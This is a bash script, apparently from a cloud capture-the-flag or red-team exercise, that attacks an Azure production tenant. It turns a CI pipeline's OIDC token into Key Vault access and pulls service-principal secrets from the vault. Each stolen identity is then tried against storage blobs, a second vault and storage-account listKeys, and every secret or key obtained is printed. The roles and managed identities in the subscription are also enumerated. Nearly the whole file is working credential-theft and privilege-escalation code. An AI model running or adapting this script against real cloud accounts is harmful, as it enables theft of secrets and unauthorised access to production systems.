#!/usr/bin/env bash
# Decisive sweep: find the credential/permission that reads config blob, or the connection string.
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RG="rg-tbl-platform-prod-sea"
APPCFG="sttblappcfgprodx3euoz"; BACKUP="sttblbackupprodx3euoz"; CILOGS="sttblcilogsprodx3euoz"
AV=2021-08-06

tok_oidc () { # $1=scope  -> uses federated OIDC assertion (the CI SP)
  local OIDC; OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
    "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
  curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$OIDC" --data-urlencode "scope=$1" | jq -r .access_token
}
tok_sp () { # $1=appId $2=secret $3=scope
  curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$1" -d "grant_type=client_credentials" -d "client_secret=$2" \
    --data-urlencode "scope=$3" | jq -r .access_token
}

KVPROD=$(tok_oidc "https://vault.azure.net/.default")

echo "### SECTION 1: ALL secret names in kv-tbl-prod-x3euoz (look for connection-string secrets)"
curl -s -H "Authorization: Bearer $KVPROD" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25" \
  | jq -r '.value[]?.id' 2>/dev/null
echo

# Build principal list: name|appId|secret  (OIDC handled as special name "OIDC-CI")
declare -a PRINS
PRINS+=("OIDC-CI|OIDC|OIDC")
for SP in sync-service-principal secrets-sync-principal cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal; do
  SEC=$(curl -s -H "Authorization: Bearer $KVPROD" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$SP?api-version=7.4" | jq -r .value)
  A=$(echo "$SEC"|jq -r .appId); K=$(echo "$SEC"|jq -r .clientSecret)
  PRINS+=("$SP|$A|$K")
done

get_tok () { # $1=name $2=appId $3=secret $4=scope
  if [ "$2" = "OIDC" ]; then tok_oidc "$4"; else tok_sp "$2" "$3" "$4"; fi
}

echo "### SECTION 2: per-principal READ of config/internal-config.json (THE FLAG) on $APPCFG"
for P in "${PRINS[@]}"; do IFS='|' read -r N A K <<<"$P"
  T=$(get_tok "$N" "$A" "$K" "https://storage.azure.com/.default")
  [ ${#T} -lt 50 ] && { echo "  [$N] no storage token"; continue; }
  CODE=$(curl -s -o /tmp/blob -w "%{http_code}" -H "Authorization: Bearer $T" -H "x-ms-version: $AV" \
    "https://$APPCFG.blob.core.windows.net/config/internal-config.json")
  echo "  [$N] GET config/internal-config.json -> $CODE"
  if [ "$CODE" = "200" ]; then echo "  *** FLAGDATA[$N]: $(cat /tmp/blob)"; fi
  # also list containers (data-plane) to see what's readable
  LC=$(curl -s -o /tmp/lc -w "%{http_code}" -H "Authorization: Bearer $T" -H "x-ms-version: $AV" "https://$APPCFG.blob.core.windows.net/?comp=list")
  echo "  [$N] list-containers $APPCFG -> $LC $( [ "$LC" = 200 ] && grep -o '<Name>[^<]*</Name>' /tmp/lc | tr '\n' ' ')"
done
echo

echo "### SECTION 3: per-principal access to RBAC vault kv-tbl-sec-x3euoz (list + read secrets)"
for P in "${PRINS[@]}"; do IFS='|' read -r N A K <<<"$P"
  T=$(get_tok "$N" "$A" "$K" "https://vault.azure.net/.default")
  [ ${#T} -lt 50 ] && { echo "  [$N] no vault token"; continue; }
  CODE=$(curl -s -o /tmp/sec -w "%{http_code}" -H "Authorization: Bearer $T" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4&maxresults=25")
  echo "  [$N] list kv-tbl-sec -> $CODE"
  if [ "$CODE" = "200" ]; then
    for ID in $(jq -r '.value[]?.id' /tmp/sec); do
      V=$(curl -s -H "Authorization: Bearer $T" "$ID?api-version=7.4" | jq -r .value)
      echo "  *** SECRET[$N] $ID = $V"
    done
  fi
done
echo

echo "### SECTION 4: per-SP listKeys on backup + appcfg (control plane)"
for P in "${PRINS[@]}"; do IFS='|' read -r N A K <<<"$P"
  T=$(get_tok "$N" "$A" "$K" "https://management.azure.com/.default")
  [ ${#T} -lt 50 ] && { echo "  [$N] no mgmt token"; continue; }
  for ACCT in $BACKUP $APPCFG; do
    CODE=$(curl -s -o /tmp/k -w "%{http_code}" -X POST -H "Authorization: Bearer $T" -H "Content-Length: 0" \
      "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$ACCT/listKeys?api-version=2023-05-01")
    echo "  [$N] listKeys $ACCT -> $CODE"
    if [ "$CODE" = "200" ]; then echo "  *** KEY[$N][$ACCT]: $(jq -r '.keys[0].value' /tmp/k)"; fi
  done
done
echo

echo "### SECTION 5: role assignments on $APPCFG and $BACKUP (who has data roles)"
MG=$(tok_oidc "https://management.azure.com/.default")
for ACCT in $APPCFG $BACKUP; do
  echo "  -- roleAssignments on $ACCT --"
  curl -s -H "Authorization: Bearer $MG" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$ACCT/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=atScope()" \
    | jq -r '.value[]? | "    principal="+.properties.principalId+" roleDef="+(.properties.roleDefinitionId|split("/")|last)+" type="+(.properties.principalType//"?")'
done
echo "  -- map well-known roleDef GUIDs --"
cat <<'MAP'
    2a2b9908-6ea1-4ae2-8e65-a410df84e7d1 = Storage Blob Data Reader
    ba92f5b4-2d11-453d-a403-e96b0029c9fe = Storage Blob Data Contributor
    b7e6dc6d-f1e8-4753-8033-0f276bb0955b = Storage Blob Data Owner
    acdd72a7-3385-48ef-bd42-f606fba81ae7 = Reader
    4633458b-17de-408a-b874-0445c86b69e6 = Key Vault Secrets User
    b86a8fe4-44ce-4948-aee7-eccf2c48b208 = Key Vault Secrets Officer
MAP
echo

echo "### SECTION 6: user-assigned managed identities in sub"
curl -s -H "Authorization: Bearer $MG" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2023-01-31" \
  | jq -r '.value[]? | "  UAMI "+.name+" clientId="+.properties.clientId+" principalId="+.properties.principalId'
echo "=== DONE ==="
